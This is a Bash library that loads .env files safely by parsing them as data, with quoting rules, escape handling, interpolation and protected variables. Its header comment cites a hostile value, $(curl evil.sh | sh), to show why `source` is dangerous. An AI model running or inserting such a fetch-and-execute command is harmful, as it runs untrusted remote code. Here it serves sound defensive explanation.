#!/usr/bin/env bash
# =============================================================================
# lib/dotenv.sh - load .env files safely (no `source`, no `eval`)
# =============================================================================
#
# Many projects load .env with `source .env` or `export $(cat .env)`. Both
# execute the file as shell code: a value like $(curl evil.sh | sh) runs.
# This parser treats the file strictly as DATA, using the same rules as
# docker compose:
#
#   KEY=value              unquoted; " #..." starts an inline comment
#   export KEY=value       the "export " prefix is accepted and ignored
#   KEY='literal $value'   single quotes: completely literal
#   KEY="a\nb ${OTHER}"    double quotes: \n \t \" \\ \$ escapes and
#                          ${VAR} / ${VAR:-default} interpolation
#
# Precedence follows the twelve-factor convention: variables already present
# in the environment WIN over the file (so `SLUICE_LOG_LEVEL=debug sluice run`
# beats .env), unless the caller asks for override.
# =============================================================================

# dotenv::load FILE [OVERRIDE(0|1)]
dotenv::load() {
  local file=$1 line key
  local -i override=${2:-0} lineno=0 errors=0
  local -r re='^(export[[:space:]]+)?([A-Za-z_][A-Za-z0-9_]*)[[:space:]]*=[[:space:]]*(.*)$'

  if [[ ! -r $file ]]; then
    log::error "dotenv: cannot read '$file'"
    return "$EX_CONFIG"
  fi

  while IFS= read -r line || [[ -n $line ]]; do
    (( ++lineno ))
    core::trim "${line%$'\r'}"
    line=$REPLY
    if [[ -z $line || $line == '#'* ]]; then
      continue
    fi
    if [[ ! $line =~ $re ]]; then
      log::error "dotenv: $file:$lineno: expected KEY=VALUE"
      (( ++errors ))
      continue
    fi
    key=${BASH_REMATCH[2]}
    if dotenv::_protected "$key"; then
      log::warn "dotenv: $file:$lineno: refusing to set protected variable $key"
      continue
    fi
    if ! dotenv::_decode "${BASH_REMATCH[3]}"; then
      log::error "dotenv: $file:$lineno: $REPLY"
      (( ++errors ))
      continue
    fi
    # `export "$key=$value"` with a validated name is safe: export assigns,
    # it never re-parses the value as code.
    if (( override )) || [[ -z ${!key+set} ]]; then
      export "$key=$REPLY"
    fi
  done < "$file"

  (( errors == 0 )) || return "$EX_CONFIG"
}

# Variables a config file must never touch: bash internals, our readonly
# runtime constants, and private (__-prefixed) globals.
dotenv::_protected() {
  case $1 in
    BASH* | SHELLOPTS | EUID | UID | PPID | IFS | EX_* | __* | SLUICE_HOME | SLUICE_LIB | SLUICE_VERSION) return 0 ;;
  esac
  return 1
}

# -----------------------------------------------------------------------------
# dotenv::_decode RAW -> REPLY (the decoded value) or returns 1 with an error
# message in REPLY.
#
# Escapes in double quotes are decoded with the SENTINEL technique: "\\" is
# first replaced by an otherwise impossible byte (\x01), and "\$" by \x02.
# Only then are \n, \t, \" decoded and ${VAR} interpolated, and finally the
# sentinels are turned back into "\" and "$". Without the sentinels the input
# \\n (an escaped backslash followed by "n") would wrongly become a newline,
# and \${VAR} would be interpolated although it was escaped.
# -----------------------------------------------------------------------------
dotenv::_decode() {
  local raw=$1 v
  local -r sq_re="^'([^']*)'([[:space:]]+#.*)?$"
  local -r dq_re='^"((\\.|[^"\\])*)"([[:space:]]+#.*)?$'
  case $raw in
    \'*)
      if [[ ! $raw =~ $sq_re ]]; then
        REPLY="unterminated single-quoted value"
        return 1
      fi
      REPLY=${BASH_REMATCH[1]}
      return 0
      ;;
    \"*)
      if [[ ! $raw =~ $dq_re ]]; then
        REPLY="unterminated double-quoted value"
        return 1
      fi
      v=${BASH_REMATCH[1]}
      v=${v//\\\\/$'\x01'}
      v=${v//\\\$/$'\x02'}
      v=${v//\\n/$'\n'}
      v=${v//\\t/$'\t'}
      v=${v//\\\"/\"}
      ;;
    *)
      # Unquoted: an inline comment starts at whitespace followed by '#'.
      v=${raw%%+([[:space:]])#*}
      ;;
  esac
  if ! core::interpolate "$v"; then
    REPLY="undefined variable \${$REPLY} (use \${$REPLY:-default} or define it first)"
    return 1
  fi
  v=${REPLY//$'\x01'/\\}
  REPLY=${v//$'\x02'/\$}
}
